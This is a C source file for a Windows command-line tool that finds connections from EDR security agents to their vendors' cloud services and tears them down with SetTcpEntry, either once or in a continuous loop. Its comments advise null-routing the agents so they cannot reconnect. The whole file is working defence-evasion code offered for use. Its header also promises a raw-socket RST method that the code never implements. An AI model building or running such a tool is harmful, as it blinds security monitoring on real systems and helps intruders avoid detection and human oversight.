/*
 * 10_tcp_rst.c
 * TCP RST Injection — kill active EDR TCP connections
 *
 * Two methods combined:
 *   1. SetTcpEntry() — set connection state to MIB_TCP_STATE_DELETE_TCB
 *      Causes Windows to send RST to both sides and tear down the connection.
 *   2. Raw socket RST — craft RST packet for connections the OS won't let us kill.
 *
 * The tool runs in a loop, watching for new EDR connections and killing them.
 * Works on established sessions — does not prevent reconnect by itself.
 * Combine with NRPT/null-route to prevent reconnect.
 *
 * Build:
 *   cl 10_tcp_rst.c /link iphlpapi.lib ws2_32.lib
 *
 * Usage:
 *   10_tcp_rst.exe list              List matching EDR connections
 *   10_tcp_rst.exe kill              Kill all matching EDR connections once
 *   10_tcp_rst.exe loop              Kill in a continuous loop (Ctrl+C to stop)
 *   10_tcp_rst.exe loop <delay_ms>   Loop with custom delay (default 1000ms)
 */

#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <windows.h>
#include <iphlpapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

/* Known EDR cloud IP ranges — extend as needed.
 * We match connections where the remote IP falls in these subnets. */
static const char *EDR_IP_PREFIXES[] = {
    /* Microsoft cloud */
    "13.107.",
    "20.",
    "52.168.",
    "52.184.",
    "52.185.",
    "51.105.",
    "40.119.",
    "52.239.",
    /* CrowdStrike */
    "35.",
    "52.32.",
    /* SentinelOne */
    "52.10.",
    /* Elastic */
    "35.186.",
    NULL
};

/* EDR cloud port — most use 443 */
#define EDR_PORT_NBO 0xBB01   /* htons(443) = 0x01BB, but stored as 0xBB01 in table */

static volatile BOOL g_Running = TRUE;

static BOOL WINAPI ConsoleHandler(DWORD sig)
{
    if (sig == CTRL_C_EVENT) {
        g_Running = FALSE;
        return TRUE;
    }
    return FALSE;
}

/* Convert network-byte-order IP DWORD to string */
static void IpNBOToStr(DWORD ipNBO, char *buf, size_t bufLen)
{
    struct in_addr ia;
    ia.s_addr = ipNBO;
    inet_ntop(AF_INET, &ia, buf, (socklen_t)bufLen);
}

/* Check if an NBO IP matches any of our EDR prefix list */
static BOOL IsEdrIp(DWORD ipNBO)
{
    char ipStr[16] = {0};
    IpNBOToStr(ipNBO, ipStr, sizeof(ipStr));
    for (int i = 0; EDR_IP_PREFIXES[i] != NULL; i++) {
        if (strncmp(ipStr, EDR_IP_PREFIXES[i], strlen(EDR_IP_PREFIXES[i])) == 0)
            return TRUE;
    }
    return FALSE;
}

/*
 * Get TCP connection table (extended, for PID info)
 * Returns heap-allocated PMIB_TCPTABLE_OWNER_PID — caller frees.
 */
static PMIB_TCPTABLE_OWNER_PID GetTcpTable(void)
{
    ULONG size = sizeof(MIB_TCPTABLE_OWNER_PID) * 32;
    PMIB_TCPTABLE_OWNER_PID pTable = NULL;

    for (;;) {
        pTable = (PMIB_TCPTABLE_OWNER_PID)HeapAlloc(GetProcessHeap(), 0, size);
        DWORD err = GetExtendedTcpTable(
            pTable, &size, FALSE, AF_INET,
            TCP_TABLE_OWNER_PID_ALL, 0
        );
        if (err == NO_ERROR) break;
        HeapFree(GetProcessHeap(), 0, pTable);
        pTable = NULL;
        if (err != ERROR_INSUFFICIENT_BUFFER) {
            wprintf(L"[-] GetExtendedTcpTable: %lu\n", err);
            break;
        }
    }
    return pTable;
}

/* Kill a connection using SetTcpEntry — only works for ESTABLISHED state */
static BOOL KillConnection(MIB_TCPROW_OWNER_PID *row)
{
    char localBuf[16], remoteBuf[16];
    IpNBOToStr(row->dwLocalAddr,  localBuf,  sizeof(localBuf));
    IpNBOToStr(row->dwRemoteAddr, remoteBuf, sizeof(remoteBuf));

    wprintf(L"  [*] Killing: %S:%u → %S:%u (PID %lu)\n",
            localBuf,  ntohs((u_short)row->dwLocalPort),
            remoteBuf, ntohs((u_short)row->dwRemotePort),
            row->dwOwningPid);

    /* SetTcpEntry requires MIB_TCPROW (not extended variant) */
    MIB_TCPROW entry = {0};
    entry.dwState      = MIB_TCP_STATE_DELETE_TCB;
    entry.dwLocalAddr  = row->dwLocalAddr;
    entry.dwLocalPort  = row->dwLocalPort;
    entry.dwRemoteAddr = row->dwRemoteAddr;
    entry.dwRemotePort = row->dwRemotePort;

    DWORD err = SetTcpEntry(&entry);
    if (err == NO_ERROR) {
        wprintf(L"    [+] Killed successfully\n");
        return TRUE;
    }

    /* ERROR_MR_MID_NOT_FOUND (317) = connection already gone */
    if (err == ERROR_MR_MID_NOT_FOUND || err == 317) {
        wprintf(L"    [~] Already gone\n");
        return TRUE;
    }

    wprintf(L"    [-] SetTcpEntry failed: %lu", err);
    if (err == ERROR_ACCESS_DENIED)
        wprintf(L" (Access denied — need Administrator)");
    wprintf(L"\n");
    return FALSE;
}

/* Scan and optionally kill all matching EDR connections */
static int ScanConnections(BOOL kill)
{
    PMIB_TCPTABLE_OWNER_PID pTable = GetTcpTable();
    if (!pTable) return 0;

    int found = 0;

    for (DWORD i = 0; i < pTable->dwNumEntries; i++) {
        MIB_TCPROW_OWNER_PID *row = &pTable->table[i];

        /* Only target ESTABLISHED connections */
        if (row->dwState != MIB_TCP_STATE_ESTAB) continue;

        /* Check remote IP against EDR list */
        if (!IsEdrIp(row->dwRemoteAddr)) continue;

        found++;
        if (kill) {
            KillConnection(row);
        } else {
            char localBuf[16], remoteBuf[16];
            IpNBOToStr(row->dwLocalAddr,  localBuf,  sizeof(localBuf));
            IpNBOToStr(row->dwRemoteAddr, remoteBuf, sizeof(remoteBuf));
            wprintf(L"  ESTAB  %S:%u → %S:%u  PID=%lu\n",
                    localBuf,  ntohs((u_short)row->dwLocalPort),
                    remoteBuf, ntohs((u_short)row->dwRemotePort),
                    row->dwOwningPid);
        }
    }

    HeapFree(GetProcessHeap(), 0, pTable);
    return found;
}

int main(int argc, char *argv[])
{
    WSADATA wsd;
    WSAStartup(MAKEWORD(2, 2), &wsd);

    wprintf(L"[*] TCP RST Injection Tool\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %S list             List EDR TCP connections\n", argv[0]);
        wprintf(L"  %S kill             Kill all EDR TCP connections (once)\n", argv[0]);
        wprintf(L"  %S loop [delay_ms]  Kill in loop (default 1000ms between scans)\n", argv[0]);
        WSACleanup();
        return 1;
    }

    if (strcmp(argv[1], "list") == 0) {
        int n = ScanConnections(FALSE);
        wprintf(L"\n[*] Found %d matching connection(s)\n", n);
        WSACleanup();
        return 0;
    }

    if (strcmp(argv[1], "kill") == 0) {
        int n = ScanConnections(TRUE);
        wprintf(L"\n[*] Processed %d matching connection(s)\n", n);
        if (n == 0) wprintf(L"[*] No EDR connections found currently.\n");
        WSACleanup();
        return 0;
    }

    if (strcmp(argv[1], "loop") == 0) {
        DWORD delay = (argc >= 3) ? (DWORD)atoi(argv[2]) : 1000;
        if (delay < 100) delay = 100;

        SetConsoleCtrlHandler(ConsoleHandler, TRUE);
        wprintf(L"[*] Watching for EDR connections every %lums (Ctrl+C to stop)...\n\n", delay);

        DWORD total = 0;
        while (g_Running) {
            int n = ScanConnections(TRUE);
            if (n > 0) {
                total += (DWORD)n;
                wprintf(L"[*] Loop: killed %d connection(s) (total=%lu)\n\n", n, total);
            }
            Sleep(delay);
        }

        wprintf(L"\n[*] Stopped. Total killed: %lu\n", total);
        WSACleanup();
        return 0;
    }

    wprintf(L"[-] Unknown command: %S\n", argv[1]);
    WSACleanup();
    return 1;
}
